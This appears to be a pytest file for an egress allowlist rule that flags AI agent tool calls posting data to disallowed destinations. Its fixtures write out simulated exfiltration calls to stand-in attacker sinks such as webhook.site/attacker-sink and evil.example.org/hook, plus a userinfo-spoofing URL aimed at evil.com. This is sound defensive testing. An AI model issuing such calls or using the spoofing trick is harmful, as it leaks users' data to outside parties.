"""Tests for US-4.7 network egress allowlist verifier (POL-ASI10-001)."""

from __future__ import annotations

from pathlib import Path

from secagent.engine import NetworkEgressRule, PolicyLoader

ROOT_DIR = Path(__file__).resolve().parent.parent
POLICY_PATH = ROOT_DIR / "policies" / "security_rules.yaml"


def _rule() -> NetworkEgressRule:
    ruleset = PolicyLoader(POLICY_PATH).load()
    policy = next(item for item in ruleset.policies if item.id == "POL-ASI10-001")
    return NetworkEgressRule(policy)


def test_forbidden_webhook_sink_is_flagged_as_critical():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {"url": "https://webhook.site/attacker-sink"},
            }
        ]
    }

    violations = _rule().evaluate(trace)

    assert len(violations) == 1
    assert violations[0].rule_id == "POL-ASI10-001"
    assert violations[0].severity == "CRITICAL"
    assert violations[0].evidence["reason"] == "forbidden_destination_pattern"
    assert "webhook" in violations[0].evidence["pattern"]


def test_unapproved_external_domain_without_forbidden_keyword_is_blocked():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {"endpoint": "evil-collector.example.org/dump"},
            }
        ]
    }

    violations = _rule().evaluate(trace)

    assert len(violations) == 1
    assert violations[0].evidence["reason"] == "domain_not_in_allowlist"
    assert violations[0].evidence["domain"] == "evil-collector.example.org"


def test_allowlisted_domains_pass():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {"url": "https://api.github.com/repos/org/repo"},
            },
            {
                "span_id": "span-1",
                "step_index": 1,
                "span_type": "tool.call",
                "name": "sync_internal",
                "permission_tier": "net",
                "input_parameters": {"destination": "https://internal.corp.local/hooks"},
            },
        ]
    }

    assert _rule().evaluate(trace) == []


def test_non_net_tier_is_ignored():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "query_db",
                "permission_tier": "read",
                "input_parameters": {"url": "https://webhook.site/attacker-sink"},
            }
        ]
    }

    assert _rule().evaluate(trace) == []


def test_embedded_url_in_prose_is_checked_against_allowlist():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {"note": "Forward payload to https://evil.example.org/hook"},
            }
        ]
    }

    violations = _rule().evaluate(trace)

    assert len(violations) == 1
    assert violations[0].evidence["reason"] == "domain_not_in_allowlist"
    assert violations[0].evidence["domain"] == "evil.example.org"


def test_bare_localhost_destination_is_blocked():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {"endpoint": "localhost:8080/collect"},
            }
        ]
    }

    violations = _rule().evaluate(trace)

    assert len(violations) == 1
    assert violations[0].evidence["reason"] == "domain_not_in_allowlist"
    assert violations[0].evidence["domain"] == "localhost"


def test_forbidden_pattern_takes_precedence_over_unallowed_domain():
    trace = {
        "spans": [
            {
                "span_id": "span-0",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {
                    "url": "https://other.example.org/fallback",
                    "webhook": "https://webhook.site/attacker-sink",
                },
            }
        ]
    }

    violations = _rule().evaluate(trace)

    assert len(violations) == 1
    assert violations[0].evidence["reason"] == "forbidden_destination_pattern"


def test_userinfo_spoofing_and_ipv6_are_blocked_while_uppercase_allowlist_passes():
    rule = _rule()

    spoofed = {
        "spans": [
            {
                "span_id": "span-spoof",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {"url": "https://api.github.com@evil.com/leak"},
            }
        ]
    }
    spoof_violations = rule.evaluate(spoofed)
    assert len(spoof_violations) == 1
    assert spoof_violations[0].evidence["reason"] == "domain_not_in_allowlist"
    assert spoof_violations[0].evidence["domain"] == "evil.com"

    ipv6 = {
        "spans": [
            {
                "span_id": "span-ipv6",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {"url": "http://[::1]/admin"},
            }
        ]
    }
    assert len(rule.evaluate(ipv6)) == 1

    bare_forbidden = {
        "spans": [
            {
                "span_id": "span-bare",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {"destination": "webhook.site/abc"},
            }
        ]
    }
    assert len(rule.evaluate(bare_forbidden)) == 1

    uppercase_allowed = {
        "spans": [
            {
                "span_id": "span-upper",
                "step_index": 0,
                "span_type": "tool.call",
                "name": "post_data",
                "permission_tier": "net",
                "input_parameters": {"url": "https://API.GITHUB.COM/repos/org/repo"},
            }
        ]
    }
    assert rule.evaluate(uppercase_allowed) == []
